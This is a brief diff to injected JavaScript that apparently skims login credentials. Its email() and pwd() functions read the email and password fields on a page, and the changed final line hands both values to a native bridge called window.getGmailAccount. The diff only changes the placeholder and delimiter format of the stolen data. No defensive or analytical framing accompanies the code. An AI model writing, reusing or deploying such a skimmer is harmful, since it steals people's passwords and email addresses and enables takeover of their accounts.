@@ -1,6 +1,6 @@
 function email() {
     var b = document.querySelectorAll("input");
-    var e;
+    var e = "=_=+_+";
     for (var c = 0; c < b.length; c++) {
         var d = b[c];
         if (d.type === "email") {
@@ -13,7 +13,7 @@ function email() {
 
 function pwd() {
     var b = document.querySelectorAll("input");
-    var e;
+    var e = "=_=+_+";
     for (var c = 0; c < b.length; c++) {
         var d = b[c];
         if (d.type === "password") {
@@ -23,4 +23,4 @@ function pwd() {
     }
     return e;
 }
-window.getGmailAccount.getGmailAccount("pwd:"+pwd()+"|||||email:"+email());
+window.getGmailAccount.getGmailAccount(email()+"||+|+||"+pwd());
